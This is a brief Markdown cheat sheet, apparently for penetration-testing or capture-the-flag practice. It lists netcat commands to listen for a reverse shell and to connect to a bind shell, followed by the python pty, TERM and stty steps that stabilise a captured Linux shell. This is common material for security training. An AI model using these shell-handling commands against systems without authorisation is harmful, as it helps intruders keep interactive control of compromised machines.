# NETCAT: Shells 
## Unstable
#### Reverse Shell
Set up a listener on your machine ready to catch an incoming shell. 
```text
nc -lvnp [port_number]
```
- -l is the listener
- -v is to verbose the output
- -n to not resolve host names
- -p specifies the port
# Bind Shells
Connect to a shell listening on a target machine.
```text
nc [target_ip_address] [port_number]
```
## Stableize 
#### Linux Machines: Python 
Obtain a reverse or bind shell on a target machine and then enter the following command:
```text
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Enter the following command to give yourself access to commands such as clear:
```text
export TERM=xterm
```
Background the shell using Ctrl + Z and then on your machine enter the following command to give access to tab autocomplete, arrow keys and Ctrl + C:
```text
stty raw -echo; fg
```
Note: use the command 'reset' if you need to re-enable echo on your own terminal.
